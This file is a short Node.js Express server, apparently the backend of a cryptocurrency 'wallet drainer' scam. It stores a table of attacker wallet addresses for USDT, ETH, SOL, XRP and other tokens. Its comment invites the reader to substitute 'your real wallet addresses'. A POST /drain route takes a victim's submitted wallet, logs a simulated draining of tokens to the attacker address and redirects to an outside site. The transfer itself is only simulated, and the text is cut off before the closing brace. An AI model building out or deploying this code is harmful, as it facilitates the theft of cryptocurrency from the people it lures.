const express = require("express");
const bodyParser = require("body-parser");
const app = express();
const port = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));

// Replace these with your real wallet addresses
const drainAddresses = {
  "USDT": "0x32D35Edd6B3A9De3D63b7592446B199ac5877d1D",
  "ETH": "0x32D35Edd6B3A9De3D63b7592446B199ac5877d1D",
  "BNB": "0x32D35Edd6B3A9De3D63b7592446B199ac5877d1D",
  "SOL": "AfmNpPQ1mD5HK7PfGWqLHaErZE44cG1RUq4qFknGv6na",
  "ADA": "0x32D35Edd6B3A9De3D63b7592446B199ac5877d1D",
  "DOT": "0x32D35Edd6B3A9De3D63b7592446B199ac5877d1D",
  "XRP": "r43HwteXiVmHhUsBzmnznYNxC2wnqZcrJy"
};

app.get("/", (req, res) => {
  res.sendFile(__dirname + "/public/index.html");
});

app.post("/drain", (req, res) => {
  const wallet = req.body.wallet;
  const token = "USDT"; // You can add logic to detect which token to drain

  // Simulate draining tokens
  console.log(`Draining ${token} from ${wallet} to ${drainAddresses[token]}`);

  res.redirect(`https://laziz017.wuaze.com`);
});

app.listen(port, () => {
  console.log(`Server is listening on port ${port}`);